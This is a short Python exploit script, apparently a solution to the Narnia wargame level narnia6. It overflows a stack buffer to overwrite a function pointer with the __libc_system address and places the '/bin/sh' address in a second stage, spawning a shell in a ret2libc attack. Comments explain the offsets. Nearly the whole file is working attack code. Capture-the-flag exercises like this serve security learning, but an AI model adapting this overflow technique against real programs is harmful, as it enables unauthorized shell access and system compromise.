#! /usr/bin/python

import sys
import struct
from subprocess import call

if sys.byteorder == 'little':
	Q = lambda x: struct.pack("<I", x)
elif sys.byteorder == 'big':
	Q = lambda x: struct.pack(">I", x)

# first buffer located at 0x20(%esp), and fptr located at 0x28(%esp).
# so the fptr exists right below our first buffer (0x28 - 0x20).
# so, to overwrite the address of fptr we need 8-bytes junk of 'whatever'
# loaded on first buffer followed by __libc_system.
stage_0 = "\x41"*(8) + Q(0xb7e53310)	# __libc_system

# second buffer size is 8-bytes too. let's write it to make 'argc' happy.. :p
# fptr overwrited. so now, we'll be find the address of /bin/sh and you're set
stage_1 = "\x41"*(8) + Q(0xb7f7384c)	# "/bin/sh"

# for debugging purpose only
open("/tmp/p0", "w").write(stage_0)
open("/tmp/p1", "w").write(stage_1)

call(["/narnia/narnia6", stage_0 + stage_1], shell=False, stderr=open("/dev/null", "w"))
